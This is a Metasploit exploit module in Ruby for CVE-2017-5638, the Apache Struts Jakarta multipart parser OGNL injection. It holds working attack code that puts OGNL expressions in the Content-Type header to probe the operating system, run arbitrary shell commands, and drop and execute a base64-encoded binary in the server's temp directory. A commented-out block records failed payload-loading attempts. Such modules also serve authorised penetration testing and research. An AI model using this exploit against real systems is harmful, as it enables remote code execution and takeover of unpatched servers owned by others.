# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Apache Struts Jakarta Multipart Parser OGNL Injection&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a remote code execution vunlerability in Apache Struts
        version 2.3.5 - 2.3.31, and 2.5 - 2.5.10. Remote Code Execution can be performed
        via http Content-Type header.

        Native payloads will be converted to executables and dropped in the
        server&#039;s temp dir. If this fails, try a cmd/* payload, which won&#039;t
        have to write to the disk.
      },
      &#039;Author&#039;         => [
        &#039;Nike.Zheng&#039;, # PoC
        &#039;Nixawk&#039;,     # Metasploit module
        &#039;Chorder&#039;,    # Metasploit module
        &#039;egypt&#039;,      # combining the above
        &#039;Jeffrey Martin&#039;, # Java fu
      ],
      &#039;References&#039;     => [
        [&#039;CVE&#039;, &#039;2017-5638&#039;],
        [&#039;URL&#039;, &#039;https://cwiki.apache.org/confluence/display/WW/S2-045&#039;]
      ],
      &#039;Privileged&#039;     => true,
      &#039;Targets&#039;        => [
        [
          &#039;Universal&#039;, {
            &#039;Platform&#039;   => %w{ unix windows linux },
            &#039;Arch&#039;       => [ ARCH_CMD, ARCH_X86, ARCH_X64 ],
          },
        ],
      ],
      &#039;DisclosureDate&#039; => &#039;Mar 07 2017&#039;,
      &#039;DefaultTarget&#039;  => 0))

      register_options(
        [
          Opt::RPORT(8080),
          OptString.new(&#039;TARGETURI&#039;, [ true, &#039;The path to a struts application action&#039;, &#039;/struts2-showcase/&#039; ]),
        ]
      )
      register_advanced_options(
        [
          OptString.new(&#039;HTTPMethod&#039;, [ true, &#039;The HTTP method to send in the request. Cannot contain spaces&#039;, &#039;GET&#039; ])
        ]
      )

    @data_header = "X-#{rand_text_alpha(4)}"
  end

  def check
    var_a = rand_text_alpha_lower(4)

    ognl = ""
    ognl << %q|(#os=@java.lang.System@getProperty(&#039;os.name&#039;)).|
    ognl << %q|(#context[&#039;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#039;].addHeader(&#039;|+var_a+%q|&#039;, #os))|

    begin
      resp = send_struts_request(ognl)
    rescue Msf::Exploit::Failed
      return Exploit::CheckCode::Unknown
    end

    if resp && resp.code == 200 && resp.headers[var_a]
      vprint_good("Victim operating system: #{resp.headers[var_a]}")
      Exploit::CheckCode::Vulnerable
    else
      Exploit::CheckCode::Safe
    end
  end

  def exploit
    case payload.arch.first
    #when ARCH_JAVA
    #  datastore[&#039;LHOST&#039;] = nil
    #  resp = send_payload(payload.encoded_jar)
    when ARCH_CMD
      resp = execute_command(payload.encoded)
    else
      resp = send_payload(generate_payload_exe)
    end

    require&#039;pp&#039;
    pp resp.headers if resp
  end

  def send_struts_request(ognl, extra_header: &#039;&#039;)
    uri = normalize_uri(datastore["TARGETURI"])
    content_type = "%{(#_=&#039;multipart/form-data&#039;)."
    content_type << "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    content_type << "(#_memberAccess?"
    content_type << "(#_memberAccess=#dm):"
    content_type << "((#container=#context[&#039;com.opensymphony.xwork2.ActionContext.container&#039;])."
    content_type << "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    content_type << "(#ognlUtil.getExcludedPackageNames().clear())."
    content_type << "(#ognlUtil.getExcludedClasses().clear())."
    content_type << "(#context.setMemberAccess(#dm))))."
    content_type << ognl
    content_type << "}"

    headers = { &#039;Content-Type&#039; => content_type }
    if extra_header
      headers[@data_header] = extra_header
    end

    #puts content_type.gsub(").", ").\n")
    #puts

    resp = send_request_cgi(
      &#039;uri&#039;     => uri,
      &#039;method&#039;  => datastore[&#039;HTTPMethod&#039;],
      &#039;headers&#039; => headers
    )

    if resp && resp.code == 404
      fail_with(Failure::BadConfig, &#039;Server returned HTTP 404, please double check TARGETURI&#039;)
    end
    resp
  end

  def execute_command(cmd)
    ognl = &#039;&#039;
    ognl << %Q|(#cmd=@org.apache.struts2.ServletActionContext@getRequest().getHeader(&#039;#{@data_header}&#039;)).|

    # You can add headers to the server&#039;s response for debugging with this:
    #ognl << %q|(#r=#context[&#039;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#039;]).|
    #ognl << %q|(#r.addHeader(&#039;decoded&#039;,#cmd)).|

    ognl << %q|(#os=@java.lang.System@getProperty(&#039;os.name&#039;)).|
    ognl << %q|(#cmds=(#os.toLowerCase().contains(&#039;win&#039;)?{&#039;cmd.exe&#039;,&#039;/c&#039;,#cmd}:{&#039;/bin/sh&#039;,&#039;-c&#039;,#cmd})).|
    ognl << %q|(#p=new java.lang.ProcessBuilder(#cmds)).|
    ognl << %q|(#p.redirectErrorStream(true)).|
    ognl << %q|(#process=#p.start())|

    send_struts_request(ognl, extra_header: cmd)
  end

  def send_payload(exe)

    ognl = ""
    ognl << %Q|(#data=@org.apache.struts2.ServletActionContext@getRequest().getHeader(&#039;#{@data_header}&#039;)).|
    ognl << %Q|(#f=@java.io.File@createTempFile(&#039;#{rand_text_alpha(4)}&#039;,&#039;.exe&#039;)).|
    #ognl << %q|(#r=#context[&#039;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#039;]).|
    #ognl << %q|(#r.addHeader(&#039;file&#039;,#f.getAbsolutePath())).|
    ognl << %q|(#f.setExecutable(true)).|
    ognl << %q|(#f.deleteOnExit()).|
    ognl << %q|(#fos=new java.io.FileOutputStream(#f)).|

    # Using stuff from the sun.* package here means it likely won&#039;t work on
    # non-Oracle JVMs, but the b64 decoder in Apache Commons doesn&#039;t seem to
    # work and I don&#039;t see a better way of getting binary data onto the
    # system. =/
    ognl << %q|(#d=new sun.misc.BASE64Decoder().decodeBuffer(#data)).|
    ognl << %q|(#fos.write(#d)).|
    ognl << %q|(#fos.close()).|

    ognl << %q|(#p=new java.lang.ProcessBuilder({#f.getAbsolutePath()})).|
    ognl << %q|(#p.start()).|
    ognl << %q|(#f.delete())|

    send_struts_request(ognl, extra_header: [exe].pack("m").delete("\n"))
  end

end

=begin
Doesn&#039;t work:

    ognl << %q|(#cl=new java.net.URLClassLoader(new java.net.URL[]{#f.toURI().toURL()})).|
    ognl << %q|(#c=#cl.loadClass(&#039;metasploit.Payload&#039;)).|
    ognl << %q|(#m=@ognl.OgnlRuntime@getMethods(#c,&#039;main&#039;,true).get(0)).|
    ognl << %q|(#r.addHeader(&#039;meth&#039;,#m.toGenericString())).|
    ognl << %q|(#m.invoke(null,null)).|

    #ognl << %q|(#m=#c.getMethod(&#039;run&#039;,@java.lang.Class@forName(&#039;java.lang.Object&#039;))).| # java.lang.IllegalArgumentException: java.lang.ClassCastException@58ce5ef0
    #ognl << %q|(#m=#c.getMethod(&#039;run&#039;,@java.lang.Class@forName(&#039;java.lang.String&#039;))).| # java.lang.IllegalArgumentException: java.lang.ClassCastException@58ce5ef0
    #ognl << %q|(#m=#c.getMethod(&#039;run&#039;,@java.lang.Class@forName(&#039;[Ljava.lang.Object;&#039;))).| # java.lang.IllegalArgumentException: java.lang.ClassCastException@58ce5ef0
    #ognl << %q|(#m=#c.getMethod(&#039;run&#039;,@java.lang.Class@forName(&#039;[Ljava.lang.String;&#039;))).| # java.lang.IllegalArgumentException: java.lang.ClassCastException@58ce5ef0
    #ognl << %q|(#m=#c.getMethod(&#039;run&#039;,new java.lang.Class[]{})).|
    #ognl << %q|(#m=#c.getMethod(&#039;run&#039;,new java.lang.Class[]{@java.lang.Class@forName(&#039;java.lang.Object&#039;)})).|
    #ognl << %q|(#m=#c.getMethod(&#039;run&#039;,new java.lang.Class[]{@java.lang.Class@forName(&#039;java.lang.String&#039;)})).|
    #ognl << %q|(#m=#c.getMethod(&#039;run&#039;,new java.lang.Class[]{@java.lang.Class@forName(&#039;java.lang.String&#039;)})).| # java.lang.IllegalArgumentException: java.lang.ClassCastException@16e2d926
    #ognl << %q|(#m=#c.getMethod(&#039;run&#039;,new java.lang.Class[]{@java.lang.Class@forName(&#039;[Ljava.lang.Object;&#039;)})).|
    #ognl << %q|(#m=#c.getMethod(&#039;run&#039;,new java.lang.Class[]{@java.lang.Class@forName(&#039;[Ljava.lang.String;&#039;)})).| # java.lang.IllegalArgumentException: java.lang.ClassCastException@684b3dfd
    #ognl << %q|(#m=#c.getMethod(&#039;run&#039;,new java.lang.Class[]{null})).|
    #ognl << %q|(#m=#c.getMethod(&#039;run&#039;,new java.lang.Object[]{@java.lang.Class@forName(&#039;java.lang.Object&#039;)})).|
    #ognl << %q|(#m=#c.getMethod(&#039;run&#039;,new java.lang.Object[]{@java.lang.Class@forName(&#039;java.lang.String&#039;)})).| # java.lang.IllegalArgumentException: java.lang.ClassCastException@16e2d926
    #ognl << %q|(#m=#c.getMethod(&#039;run&#039;,new java.lang.Object[]{@java.lang.Class@forName(&#039;[Ljava.lang.Object;&#039;)})).|
    #ognl << %q|(#m=#c.getMethod(&#039;run&#039;,new java.lang.Object[]{@java.lang.Class@forName(&#039;[Ljava.lang.String;&#039;)})).| # java.lang.IllegalArgumentException: java.lang.ClassCastException@684b3dfd
    #ognl << %q|(#m=#c.getMethod(&#039;run&#039;,new java.lang.Object[]{})).|      # java.lang.IllegalArgumentException: java.lang.ClassCastException@4b232ba9
    #ognl << %q|(#m=#c.getMethod(&#039;run&#039;,new java.lang.Object[]{null})).|      # java.lang.IllegalArgumentException: java.lang.ClassCastException@4b232ba9
    #ognl << %q|(#m=#c.getMethod(&#039;run&#039;,new java.lang.Object[]{null})).|  # java.lang.IllegalArgumentException: java.lang.ClassCastException@4fee2899
    #ognl << %q|(#m=#c.getMethod(&#039;run&#039;,new java.lang.Object[])).|        # parse failed
    #ognl << %q|(#m=#c.getMethod(&#039;run&#039;,null)).|                          # java.lang.IllegalArgumentException: java.lang.ClassCastException@50af0cd6

    #ognl << %q|(#m=#c.getMethod(&#039;main&#039;,@java.lang.Class@forName(&#039;java.lang.Object&#039;))).| # java.lang.IllegalArgumentException: java.lang.ClassCastException@58ce5ef0
    #ognl << %q|(#m=#c.getMethod(&#039;main&#039;,@java.lang.Class@forName(&#039;java.lang.String&#039;))).| # java.lang.IllegalArgumentException: java.lang.ClassCastException@58ce5ef0
    #ognl << %q|(#m=#c.getMethod(&#039;main&#039;,@java.lang.Class@forName(&#039;[Ljava.lang.Object;&#039;))).| # java.lang.IllegalArgumentException: java.lang.ClassCastException@58ce5ef0
    #ognl << %q|(#m=#c.getMethod(&#039;main&#039;,@java.lang.Class@forName(&#039;[Ljava.lang.String;&#039;))).| # java.lang.IllegalArgumentException: java.lang.ClassCastException@2231d3a9
    #ognl << %q|(#m=#c.getMethod(&#039;main&#039;,new java.lang.Class[]{})).|
    #ognl << %q|(#m=#c.getMethod(&#039;main&#039;,new java.lang.Class[]{@java.lang.Class@forName(&#039;java.lang.Object&#039;)})).|
    #ognl << %q|(#m=#c.getMethod(&#039;main&#039;,new java.lang.Class[]{@java.lang.Class@forName(&#039;java.lang.String&#039;)})).|
    #ognl << %q|(#m=#c.getMethod(&#039;main&#039;,new java.lang.Class[]{@java.lang.Class@forName(&#039;[Ljava.lang.Object;&#039;)})).|
    #ognl << %q|(#m=#c.getMethod(&#039;main&#039;,new java.lang.Class[]{@java.lang.Class@forName(&#039;[Ljava.lang.String;&#039;)})).| # java.lang.IllegalArgumentException: java.lang.ClassCastException@684b3dfd
    #ognl << %q|(#m=#c.getMethod(&#039;main&#039;,new java.lang.Class[]{null})).|
    #ognl << %q|(#m=#c.getMethod(&#039;main&#039;,new java.lang.Object[]{@java.lang.Class@forName(&#039;java.lang.Object&#039;)})).|
    #ognl << %q|(#m=#c.getMethod(&#039;main&#039;,new java.lang.Object[]{@java.lang.Class@forName(&#039;java.lang.String&#039;)})).| # java.lang.IllegalArgumentException: java.lang.ClassCastException@16e2d926
    #ognl << %q|(#m=#c.getMethod(&#039;main&#039;,new java.lang.Object[]{@java.lang.Class@forName(&#039;[Ljava.lang.Object;&#039;)})).|
    #ognl << %q|(#m=#c.getMethod(&#039;main&#039;,new java.lang.Object[]{@java.lang.Class@forName(&#039;[Ljava.lang.String;&#039;)})).| # java.lang.IllegalArgumentException: java.lang.ClassCastException@16e2d926
    #ognl << %q|(#m=#c.getMethod(&#039;main&#039;,new java.lang.Object[]{})).|     # java.lang.IllegalArgumentException: java.lang.ClassCastException@5f78809f
    #ognl << %q|(#m=#c.getMethod(&#039;main&#039;,new java.lang.Object[]{null})).|      # java.lang.IllegalArgumentException: java.lang.ClassCastException@4b232ba9
    #ognl << %q|(#m=#c.getMethod(&#039;main&#039;,new java.lang.Object[]{null})).| # java.lang.IllegalArgumentException: java.lang.ClassCastException@56c6add5
    #ognl << %q|(#m=#c.getMethod(&#039;main&#039;,new java.lang.Object[])).|       # parse failed
    #ognl << %q|(#m=#c.getMethod(&#039;main&#039;,null)).|                         # java.lang.IllegalArgumentException: java.lang.ClassCastException@1722884

=end

